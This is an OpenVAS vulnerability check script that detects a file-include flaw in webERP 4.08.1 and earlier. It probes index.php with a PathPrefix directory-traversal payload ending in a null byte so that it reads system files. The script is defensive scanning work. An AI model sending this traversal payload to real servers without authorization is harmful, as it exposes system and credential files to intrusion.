###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_weberp_54236.nasl 11003 2018-08-16 11:08:00Z asteins $
#
# webERP Multiple Remote and Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103505");
  script_bugtraq_id(54236);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_version("$Revision: 11003 $");
  script_name("webERP Multiple Remote and Local File Include Vulnerabilities");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54236");
  script_xref(name:"URL", value:"http://www.weberp.org/HomePage");
  script_tag(name:"last_modification", value:"$Date: 2018-08-16 13:08:00 +0200 (Thu, 16 Aug 2018) $");
  script_tag(name:"creation_date", value:"2012-07-02 11:58:46 +0200 (Mon, 02 Jul 2012)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_tag(name:"summary", value:"webERP is prone to multiple remote and local file-include
vulnerabilities because it fails to sufficiently sanitize user-
supplied input.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary server-side
script code that resides on an affected computer or in a remote
location with the privileges of the web server process. This may
facilitate unauthorized access.");

  script_tag(name:"affected", value:"webERP 4.08.1 and prior are vulnerable.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port( default:80 );
if( ! can_host_php( port:port ) ) exit( 0 );

files = traversal_files();

foreach dir( make_list_unique( "/webERP", "/weberp", "/erp", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach file( keys( files ) ) {

    url = dir + "/index.php?PathPrefix=" + crap( data:"../", length:9 * 6 ) + files[file] + "%00";

    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
